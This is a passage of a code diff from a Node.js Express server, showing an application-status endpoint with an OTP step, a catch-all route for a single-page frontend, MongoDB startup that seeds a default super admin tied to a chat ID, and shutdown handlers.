+        else if (step === 'otp') status = appData.otpStatus || 'pending';
+
+        res.json({ ok: true, status });
+    } catch (error) {
+        console.error('❌ Error fetching application status:', error);
+        res.status(500).json({ ok: false, message: 'Internal server error' });
+    }
+});
+
+// Catch-all route for frontend Single Page Application (SPA)
+app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, '..', 'frontend', 'index.html'));
+});
+
+// ============================================================
+// SERVER BOOTSTRAP & DATABASE INITIALIZATION
+// ============================================================
+async function startServer() {
+    try {
+        // Connect to MongoDB
+        await connectDatabase();
+
+        // Seed Super Admin if database contains no admins
+        const adminCount = await getAdminCount();
+        if (adminCount === 0 && DEFAULT_CHAT_ID) {
+            console.log('⚡ Initializing default Super Admin in database...');
+            await saveAdmin({
+                adminId: 'ADMIN001',
+                name: 'Super Admin',
+                chatId: DEFAULT_CHAT_ID,
+                role: 'super_admin',
+                status: 'active'
+            });
+        }
+
+        app.listen(PORT, () => {
+            console.log(`🚀 Multi-Admin Server active on port ${PORT}`);
+        });
+    } catch (error) {
+        console.error('❌ Failed to start server:', error);
+        process.exit(1);
+    }
+}
+
+// Graceful Shutdown Handlers
+process.on('SIGINT', async () => {
+    console.log('\n🛑 Shutting down server...');
+    await closeDatabase();
+    process.exit(0);
+});
+
+process.on('SIGTERM', async () => {
+    console.log('\n🛑 Shutting down server...');
+    await closeDatabase();
+    process.exit(0);
+});
+
+startServer();
